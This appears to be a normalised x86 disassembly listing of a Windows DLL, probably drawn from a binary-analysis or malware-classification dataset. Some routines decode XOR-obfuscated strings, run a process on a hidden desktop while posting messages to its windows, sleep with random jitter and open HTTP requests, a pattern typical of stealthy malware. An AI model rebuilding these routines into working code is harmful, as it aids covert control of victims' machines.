mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10046777
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_10060405
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_1003e323
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_100689d0
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov cx [ ebp + 0xe ]
mov eax 0x7ff8
push esi
mov esi eax
and cx si
pop esi
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_10068a40
push ebp
mov ebp esp
push 0xffffffff
push sub_10087d98
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x34 ] eax
mov ebx ecx
mov [ ebp - 0x30 ] edi
cmp eax edi
je r-xdata
push edi
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ esi ] ax
call sub_10034100
cmp ebx edi
je r-xdata
push edi
push edi
push ebx
push eax
push edi
push edi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
push r--data
mov ecx esi
call sub_1004a920
jmp r-xdata
lea eax [ eax + eax + 0x2 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
push ecx
mov edi eax
push edi
push ebx
push edx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
xor eax eax
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
call sub_10034100
xor ebx ebx
push edi
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x2c ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10033f90
lea ecx [ ebp - 0x2c ]
call sub_100702e0
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10068b80
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
push edi
xor edi edi
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4c ] edi
call sub_10023960
mov [ ebp - 0x50 ] eax
cmp eax edi
je r-xdata
push 0x4
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x48 ]
lea eax [ edi + 0x62 ]
call sub_1002f620
mov esi [ ebp - 0x4c ]
cmp esi edi
je r-xdata
inc [ edi ]
lea eax [ ebp - 0x5c ]
cmp ebx eax
je r-xdata
mov [ eax ] edi
mov edi eax
mov esi [ ebp - 0x54 ]
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x50 ]
pop edi
mov [ esi ] 0x0
xor ecx ebp
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
call sub_100324d0
jmp r-xdata
mov esi [ ebp - 0x4c ]
mov eax [ ebx + 0x4 ]
dec [ eax ]
jne r-xdata
test esi esi
je r-xdata
mov esi [ ebp - 0x4c ]
mov [ ebx ] esi
mov [ ebx + 0x4 ] edi
inc [ edi ]
jmp r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_100324d0
dec [ edi ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
call sub_100324d0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10068c70
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_10030594
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_10071bf0
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x8
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
cmp eax 0x8
jb r-xdata
mov edi ebx
xor edx edx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] dx
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1000a86e
mov ebx [ ebp + 0x8 ]
add esp 0x4
lea ecx [ edi + edi ]
push ecx
push ebx
push esi
call sub_1007f580
add esp 0xc
sub_10068d50
push ecx
push r--data
call sub_1000d280
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xa
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
cmp eax 0x102
sete cl
mov eax ecx
pop ecx
retn
mov eax 0x1
pop ecx
retn
sub_10068d85
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10051cf5
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1005b670
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_100718ba
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10030370
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10068ea0
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
mov ebx edi
push esi
lea esi [ eax + 0x1c ]
sub ebx eax
push 0xffffffff
push 0x0
push edi
mov ecx eax
call sub_1002d970
mov eax [ ebx + esi ]
add [ ebp - 0x4 ] 0x24
mov [ esi ] eax
mov ecx [ ebx + esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] ecx
add edi 0x24
add esi 0x24
cmp edi [ ebp + 0x8 ]
jne r-xdata
pop esi
pop ebx
sub_10068ee9
push 0x5c
mov eax sub_10085bf5
call sub_10047689
fldz
mov eax [ ebp + 0x8 ]
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x18 ]
fcom st1
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x64 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x64 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] ax
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000f103
add esp 0x14
xor esi esi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_10032181
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_1002f56c
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_10023cd6
push [ ebp - 0x64 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp - 0x68 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x60 ]
call sub_1001339a
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10069470
mov eax [ ebp - 0x60 ]
call sub_100262c3
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_10032181
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1002f56c
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
sub_10069020
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10069070
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
sub eax ebx
sar eax 0x2
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx edi
je r-xdata
cmp eax 0x20
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
push edi
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
call sub_10058070
mov ecx [ ebp - 0x8 ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov esi eax
cdq
sub eax edx
sar eax 0x1
add esi eax
mov eax [ ebp - 0x4 ]
mov edx edi
sub edx eax
sub ecx ebx
add esp 0x10
and edx 0xfffffffc
and ecx 0xfffffffc
cmp ecx edx
mov edx [ ebp + 0x14 ]
push edx
push esi
jge r-xdata
mov edx [ ebp + 0x14 ]
push edx
push edi
push ebx
call sub_1002fc40
add esp 0xc
mov eax edi
sub eax ebx
and eax 0xfffffffc
cmp eax 0x4
jle r-xdata
push edi
push eax
call sub_10069070
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
push eax
push ebx
call sub_10069070
mov ecx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ecx
mov ebx ecx
jmp r-xdata
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax edi
call sub_10023830
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx edi
mov eax ebx
call sub_1004ff60
add esp 0x4
test esi esi
jle r-xdata
mov eax edi
sub eax ebx
sar eax 0x2
add esp 0x10
cmp eax 0x20
jg r-xdata
sub_10069160
push ebp
mov ebp esp
sub esp 0x2b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx [ r--data ]
mov [ ebp - 0x26c ] eax
push edi
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2c
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
push eax
push __dos_header
push eax
push eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x14 ] ax
call [ CreateDesktopW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x44
lea edx [ ebp - 0x2b4 ]
push 0x0
push edx
call sub_1007f8f0
xor eax eax
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] eax
add esp 0xc
lea edx [ ebp - 0x40 ]
mov eax 0xfb
mov [ ebp - 0x2b4 ] 0x44
call sub_10069020
mov eax edx
lea ecx [ ebp - 0x264 ]
push ecx
lea edx [ ebp - 0x2b4 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
push 0x0
mov [ ebp - 0x2ac ] eax
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0xd
call sub_10069020
mov edi [ Sleep@IAT ]
mov esi [ EnumDesktopWindows@IAT ]
mov eax edx
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x268 ] 0x0
push ebx
call [ CloseDesktop@IAT ]
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x24c ]
push edx
call [ SysAllocString@IAT ]
mov edx [ ebp - 0x254 ]
mov ecx [ ebp - 0x26c ]
mov esi [ PostMessageW@IAT ]
push 0x0
push 0x0
push 0x10
push edx
mov [ ecx ] eax
call esi
mov eax [ ebp - 0x254 ]
push 0x0
push 0x0
push 0x12
push eax
call esi
xor esi esi
mov eax [ ebp - 0x268 ]
inc eax
mov [ ebp - 0x268 ] eax
cmp eax 0x258
jl r-xdata
mov edx [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ ebp - 0x264 ]
push eax
call esi
push ebx
call [ CloseDesktop@IAT ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x12c
jl r-xdata
push 0x64
call edi
lea ecx [ ebp - 0x254 ]
push ecx
push sub_1003c490
push ebx
mov [ ebp - 0x254 ] 0x0
call esi
cmp [ ebp - 0x254 ] 0x0
jne r-xdata
mov edx [ ebp - 0x264 ]
push 0x0
push edx
call [ TerminateProcess@IAT ]
mov eax [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ ebp - 0x264 ]
push ecx
call esi
push ebx
call [ CloseDesktop@IAT ]
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x64
call edi
mov ecx [ ebp - 0x254 ]
push ecx
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x264 ]
push 0x0
push ecx
call [ TerminateProcess@IAT ]
sub_100693d0
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10069410
push ebp
mov ebp esp
push ecx
mov edx [ eax + 0x10 ]
push ebx
mov ebx [ eax + 0x14 ]
push edi
mov edi [ ecx + 0x10 ]
sub ebx edx
mov [ ebp - 0x4 ] 0x0
cmp edi ebx
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_10004e10
mov ebx [ ecx + 0x14 ]
sub ebx edi
cmp ebx edx
jb r-xdata
push 0xffffffff
push 0x0
push eax
push 0x0
call sub_10067560
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1003acf0
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10069470
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor eax eax
mov [ esi + edi * 2 ] ax
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1000a86e
pop ecx
pop ebx
lea eax [ edi + edi ]
push eax
push ebx
push esi
call sub_1007f580
add esp 0xc
sub_100694c0
push ebp
mov ebp esp
sub esp 0x264
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
call sub_1001cd80
cmp eax ebx
je r-xdata
call sub_1006ed60
test eax eax
je r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov ecx eax
call sub_10001620
test eax eax
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
or [ rw-data ] esi
push sub_1008ad10
call sub_10064546
add esp 0x4
mov [ rw-data ] esi
lea eax [ ebp - 0x25c ]
push eax
lea ecx [ ebp - 0x260 ]
call sub_10056e80
test eax eax
je r-xdata
call sub_1004f7b0
cmp eax ebx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edi esi
mov ecx eax
call sub_1001cc80
test eax eax
jne r-xdata
mov esi rw-data
call sub_1000c610
cmp [ rw-data ] ebx
je r-xdata
lea ecx [ ebp - 0x258 ]
push ecx
push rw-data
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
mov edi [ GetTickCount@IAT ]
call edi
xor ebx ebx
mov esi 0x1
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x25c ] ebx
mov [ ebp - 0x260 ] ebx
cmp [ rw-data ] esi
jne r-xdata
mov esi [ rw-data ]
mov [ rw-data ] eax
test esi esi
je r-xdata
mov [ rw-data ] esi
lea eax [ ebp - 0x25c ]
push eax
mov [ ebp - 0x25c ] ebx
call sub_10026420
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov eax [ ebp - 0x25c ]
xor edx edx
sub esi ecx
div esi
add esp 0x4
add edx ecx
imul edx edx 0x3e8
push edx
call [ Sleep@IAT ]
jmp r-xdata
call edi
mov edx eax
sub edx [ ebp - 0x264 ]
mov eax [ rw-data ]
add eax edx
mov [ rw-data ] eax
cmp eax 0x927c0
jb r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x22c ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov esi rw-data
call sub_1000c610
test ebx ebx
je r-xdata
mov ecx esi
call sub_100277d0
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
test [ rw-data ] 0x1
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x22c ]
push edx
mov ecx rw-data
call sub_10034100
lea eax [ ebp - 0x260 ]
push eax
lea ecx [ ebp - 0x25c ]
push ecx
lea eax [ ebp - 0x22c ]
call sub_100505a0
add esp 0x8
neg eax
sbb eax eax
inc eax
cmp eax ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
call sub_1004f7b0
cmp eax ebx
je r-xdata
or [ rw-data ] 0x1
push sub_1008ad10
call sub_10064546
add esp 0x4
mov edi 0x2
jmp r-xdata
lea ecx [ ebp - 0x25c ]
push ecx
mov [ ebp - 0x25c ] 0x0
call sub_10026420
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov eax [ ebp - 0x25c ]
xor edx edx
sub esi ecx
div esi
add esp 0x4
add edx ecx
imul edx edx 0x3e8
push edx
call [ Sleep@IAT ]
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
cmp edi 0x2
jne r-xdata
lea eax [ ebp - 0x25c ]
call sub_100500a0
jmp r-xdata
mov ecx eax
call sub_1001cc80
test eax eax
jne r-xdata
mov ebx [ ebp - 0x25c ]
mov edx [ ebp - 0x260 ]
push ebx
call sub_10054770
test eax eax
jne r-xdata
lea eax [ ebp - 0x25c ]
mov esi rw-data
call sub_1005ee70
mov [ rw-data ] 0x1
sub_100697b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084f0b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp edx 0x5
ja r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x20 ]
or edx 0x400000
push edx
mov edx [ ebp + 0x18 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx ]
push eax
call [ HttpOpenRequestW@IAT ]
xor ecx ecx
mov esi eax
test esi esi
setne cl
push ecx
call sub_10023cc0
add esp 0x4
test esi esi
je r-xdata
jmp [ edx * 4 + jump_table_10069874 ]
xor eax eax
push 0x8
call sub_1002e3ac
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
push esi
mov ecx eax
call sub_1000b9c0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
sub_1006988c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_10030ed0
sub_100698c0
push esi
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_1000a86e
add esp 0x4
push eax
call sub_10019274
add esp 0x4
sub_1006995b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_1001f91c
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_100699a0
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x5
call [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_100699f0
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ esi + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ esi + 0x8 ]
add [ edi + 0x28 ] ecx
mov edx [ esi + 0x8 ]
mov ecx [ esi + 0x18 ]
push ebx
push edx
push ecx
push eax
call sub_1007f580
mov eax [ edi + 0x38 ]
lea ebx [ edi + 0x34 ]
add esp 0xc
cmp esi eax
jae r-xdata
pop edi
mov eax 0x1
pop esi
pop ebp
retn 0x4
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
cmp ecx esi
ja r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
call sub_1006a360
sub esi ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x20
mov edx [ edi + 0x2c ]
pop ebx
cmp [ edi + 0x28 ] edx
jne r-xdata
mov ecx 0x8
mov edi eax
[ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
and esi 0xffffffe0
add esi [ ebx ]
jmp r-xdata
mov edx ebx
call sub_1006a360
pop edi
mov eax 0x2
pop esi
pop ebp
retn 0x4
mov ecx [ edi + 0x24 ]
call sub_10029d90
mov [ edi + 0x30 ] eax
pop edi
xor eax eax
pop esi
pop ebp
retn 0x4
sub_10069a97
push 0x58
mov eax sub_10085b1e
call sub_10047689
movzx eax [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_10007a10
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1004aa10
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_1002be90
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx ebx [ ebp + 0x1c ]
